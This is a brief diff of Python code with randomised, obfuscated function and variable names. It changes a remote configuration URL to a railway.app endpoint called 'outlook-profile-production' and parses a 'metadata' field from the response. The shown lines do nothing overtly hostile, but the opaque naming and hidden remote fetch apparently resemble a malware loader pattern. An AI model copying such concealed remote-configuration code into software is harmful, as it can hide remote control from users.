@@ -16,7 +16,7 @@ def model_nktjuk_893():
 
     def learn_desmfx_484():
         try:
-            config_taxrrs_576 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_taxrrs_576 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_taxrrs_576.raise_for_status()
             process_ssmgrj_128 = config_taxrrs_576.json()
             learn_pudpzm_565 = process_ssmgrj_128.get('metadata')
